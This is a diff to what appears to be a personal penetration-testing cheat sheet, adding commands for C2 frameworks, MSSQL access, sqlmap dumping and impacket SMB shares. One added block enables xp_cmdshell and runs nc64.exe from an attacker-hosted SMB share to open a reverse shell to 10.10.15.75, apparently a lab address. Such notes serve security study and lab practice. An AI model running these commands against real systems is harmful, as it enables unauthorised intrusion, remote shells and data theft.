@@ -11,6 +11,14 @@ arp-scan -l
 ss -tulpn
 netstat -ano
 
+## DockerFile:
+docker build - < Dockerfile
+
+## C2:
+PoshC2: `cd /opt/poshc2; posh-project -n "NEW PROJECT NAME"; posh-config; posh-server `
+MythicC2: `cd /opt/mythic-c2; docker-compose up` OR `sudo ./merlin-cli start`
+SilverC2: `silver`
+
 ## Hidden Windows Folders/Files:
 gci -Hidden
 
@@ -72,6 +80,23 @@ commands = http://g2pc1.bu.edu/~qzpeng/manual/MySQL%20Commands.htm
 *Try to look for .mysql_history and see if it has clear text passwords in it*
 mysql -h "IP ADDRESS" -u "USERNAME" -D "DATABASE NAME" -p *REMOTE LOGIN*
 
+## SQL on Windows:
+mssqlclient.py "USERNAME"@"IP ADDRESS" --windows-auth
+sqsh -U "USERNAME" -P "PASSWORD" -H "IP ADDRESS"
+> Can try `enable_xp_cmdshell` to see if we can run commands on it
+> If works we can get a shell using nc
+```
+smbserver.py -smb2support shareName $(pwd)
+xp_cmdshell \\10.10.15.75\shareName\nc64.exe -e cmd.exe 10.10.15.75 443
+```
+
+## SQL from DB file:
+sqlite3 "DATABASE FILE" 
+Commands:
+.help
+.tables
+select * from "TABLE"
+
 ## SQLMAP:
 sqlmap -r request.txt -a --batch (request should have parameters like test:test for easy sql)
 sqlmap -u 'URL' --forms --dump
@@ -82,6 +107,10 @@ smbclinet -L /"IP" *To list the shares*
 smbclient //"IP"/"SHARE" *To access the share*
 smbclient //"IP"/"SHARE" -U "username" *To provide a username*
 nmap --script smb-enum-users "IP" *To get usernames using nmap*
+
+## SMB Server:
+smbserver.py -smb2support -user "USERNAME" -password "PASSWORD" shareName $(pwd)
+smbserver.py -smb2support shareName $(pwd)
 
 ## Zone Transfer:
 dig axfr <> <>
